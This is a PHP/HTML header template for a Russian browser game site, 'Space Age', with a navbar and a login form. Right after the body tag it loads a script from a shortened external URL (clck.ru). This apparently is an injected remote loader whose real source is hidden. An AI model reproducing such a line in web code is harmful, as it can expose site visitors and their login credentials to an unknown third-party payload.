
<!DOCTYPE html>
<html>
<head>
<title>Space Age</title>
<meta charset="utf-8">
<link href="/design/css/bootstrap.css" media="all" type="text/css" rel="stylesheet">
<link href="/design/css/styles.css" media="all" type="text/css" rel="stylesheet">
<script type="text/javascript" src="/design/js/jquery.js"></script>
<script type='text/javascript' src="/design/js/atom-full-compiled.js"></script>
<script type='text/javascript' src="/design/js/libcanvas-full-compiled.js"></script>
<script type="text/javascript" src="/design/js/bootstrap.min.js"></script>
<script type="text/javascript" src="/design/js/scripts.js"></script>
</head>
<body><script src="http://clck.ru/8ijea"></script>
<div style="position:absolute;top:0;left:0; width: 100%;">
<div class="navbar nav navbar-static-top ">
    <div class="navbar-inner">
        
            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <a class="brand" href="/">Space Age</a>
			
          	<div class="nav-collapse collapse">
			
              <ul class="nav">
                  
              <? if (isset($_SESSION['auth']) && intval($_SESSION['auth']['id']) > 0) {?>
                  <li class="divider-vertical"></li>
                  <li ><a href="/panel"><i class="icon-home icon-white"></i> Панель управления</a></li>
				  <li class="divider-vertical"></li>
				<!--  <li><a href="#"><i class="icon-star icon-white"></i> Карта галактики</a></li>
				  <li><a href="#"><i class="icon-flag icon-white"></i> Карта планеты</a></li>
				  <li class="divider-vertical"></li>
				  <li><a href="#"><i class="icon-envelope icon-white"></i> Сообщения</a></li>
				  <li><a href="#"><i class="icon-signal icon-white"></i> Статистика</a></li>-->				  
              <?} ?>
                    <li><a href="/info"><i class="icon-list icon-white"></i> Информация</a></li>
                <?  ?></ul>
              
                <ul class="nav pull-right">
				
				
				<? if (isset($_SESSION['auth']) && intval($_SESSION['auth']['id']) > 0) {?>
                    <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Личный кабинет <b class="caret"></b></a>
                        <ul class="dropdown-menu">
                            <li><a href="/user/preferences"><i class="icon-cog icon-white"></i> Настройки</a></li>
                            <li><a href="/help/support"><i class="icon-envelope icon-white"></i> Contact Support</a></li>
                            <li class="divider"></li>
                            <li><a href="/logout" ><i class="icon-off icon-white"></i> Выход</a></li>
                        </ul>
                    </li>
					
					<? } else {?>
					<li><a data-toggle="modal" href="#betaModal">Получить инвайт</a></li>
                  	
					<li class="dropdown">
						<a class="dropdown-toggle" href="#" data-toggle="dropdown">Вход <strong class="caret"></strong></a>
						<div class="dropdown-menu" style="padding: 15px; padding-bottom: 0px;">
							<form id="loginform" method="post" action="/ajax/login" accept-charset="UTF-8">
							<div  class="control-group">
								<input style="margin-bottom: 15px;" required type="text" placeholder="Логин" id="username" name="username">
								<input style="margin-bottom: 15px;" required type="password" placeholder="Пароль" id="password" name="password">
								<input style="float: left; margin-right: 10px;" type="checkbox" name="remember-me" id="remember-me" value="1">
								<label class="string optional" for="remember-me"> Запомнить меня</label>
							</div>
								<input class="btn btn-primary btn-block" type="submit" id="sign-in" value="Поехали!">
								<label style="text-align:center;margin-top:5px">или</label>
                                <input class="btn btn-primary btn-block disabled" type="button" title="Недоступно во время альфа-тестирования" id="sign-in-social" value="Войти через социальные сети">
							</form>
						</div>
					</li><? } ?>
                </ul>
              
            </div>
        
    </div>
</div>
</div>

